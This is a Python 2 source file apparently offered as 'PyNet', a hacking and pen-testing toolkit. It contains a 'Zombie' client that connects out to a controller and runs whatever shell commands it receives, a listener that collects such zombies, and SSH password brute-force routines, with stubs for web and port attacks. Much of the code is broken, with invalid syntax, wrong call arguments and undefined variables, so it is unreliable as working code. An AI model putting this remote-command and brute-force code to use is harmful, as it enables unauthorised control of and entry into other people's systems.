#!/usr/bin/env python

#This is PyNet, used for all your networking purposes. This library is not responsible for the damage inflicted by malicious users
#Linux 1.0 PyNet

import os
import getopt
import sys
import socket
import subprocess
import time
import paramiko

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
M = '\033[1;35;32m' # magenta

def client_connect(target, port):
    s = socket.socket()
    s.connect(target, port)
    while True:
        name = s.recv(1024)
        s.send(name, ": 'Zombie here'")
        Cmd = s.recv(1024)
        Output = subprocess.check_output(Cmd, shell=True)
        s.send(Output)
        time.sleep(10)


def usage():
    print "This is a networking tool using the socket module and expanding on it"
    print "Pure Python, NetPy is an open source project for hackers (not black hats) and pen-testers"

    print "To contribute go to https://github.com[account]\n"

    print "Use -h for help, -t to define target and -p to define the port\n"
    print "Examples:\n"

    print "netpy -t [IP] -p 80"
    print "netpy -h"
    print "netpy --target 0.0.0.0 --port 12345"
    
    



def server_setup(port):
    i = 0
    s = socket.socket()
    host = socket.gethostname()
    s.bind((host, port))
    print "Starting Server On Host: ", host,"And Port: %s" %port
    while True:
        s.listen(5)
        conn, addr = s.accept()
        print addr, "Connected"
        name = "Zombie", i, addr
        i+=1
        print name
        addr.send(name)
    try:
        opts, args = getopt.getopt(sys.argv[1:],"h:t:p:", ["help","target","port"])
    except getopt.GetoptError as err:
        print str(err)
        
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = a
        else:
            print "Option Not Supported"

def brute_SSH_user(target, user, pass_file):
    ssh = paramiko.SSHClient()
    for pass_word in pass_file:
        try:
            ssh.connect(target, username=user, password=pass_word)
            print "Trying Password: " + color.GREEN + pass_word + color.END + "Status: " + color.GREEN + "FOUND!"
            pass_word = foundpass
            break
        except:
            ssh.connect(target, username=user, password=pass_word)
            print "Trying Password: " + color.RED + pass_word + color.END + "Status: " + color.RED + "FAIL"

    print "Password is " + color.GREEN + foundpass + color.END


def brute_SSH_no_user(target, user_file, pass_file):
    ssh = paramiko.SSHClient()
    for password and username in pass_file and user_file:
        try:
            ssh.connect(target, username=username, password=password)
            print "Trying Password: " + color.GREEN + pass_word + color.END + "Status: " + color.GREEN + "FOUND!"
            pass_word = foundpass
            break
        except:
            ssh.connect(target, username=username, password=password)
            print "Trying Password: " + color.RED + pass_word + color.END + "Status: " + color.RED + "FAIL"


def brute_web(target, username, pass_file, success_check):
    s = socket.socket
    try:
        s.connect((target, port))
        print "Connected To %s" % target
    except:
        print "Failed To Connect"


def brute_force_port(target, port,):
   s = socket.socket
   try:
      s.connect(target, port)
      print "Connected!"
   except:
      print "Failed To Connect"
   data_send = raw_input("Send Data? y/n")
   if data_send == 'y':
      data = raw_input("Enter String: ")
      s.send(data)
   else:
      print "Data Not Sent Moving On"
   port_scan_opt = raw_input("Do You Want To Port Scan Before Resuming? y/n")
   if port_scan_opt == 'y':
      port_scan()
      #Add port scan function
   

   option = raw_input("Choose Attack Method: SSH, TCP, UDP,")
   

#<form name="HTSLOGIN" method="POST" action="/user/login">
#<table width="100%" border="0" align="center" cellpadding="5">
 # <tr>
  #  <td><label for="login_username" accesskey="u" class="left">Username:</label></td>
   # <td><input type="text" name="username" id="login_username" class="right" style="font-size: 10px;" /></td>
  #</tr>
  #<tr>
   # <td><label for="login_password" accesskey="p" class="left">Password:</label></td>
  #  <td><input type="password" name="password" id="login_password" class="right" style="font-size: 10px;" /></td>
  #</tr>
  #<tr>

            
        


#["netpy"] = "This is a networking tool using the socket module and expanding on it\nPure Python, NetPy is an open source project for hackers (not black hats) and pen-testers\nTo contribute go to https://github.com[account]\n\nUse -h for help, -t to define target and -p to define the port\nExamples:\nnetpy -t [IP] -p 80\nnetpy -hnetpy --target 0.0.0.0 --port 12345"




       



 

       
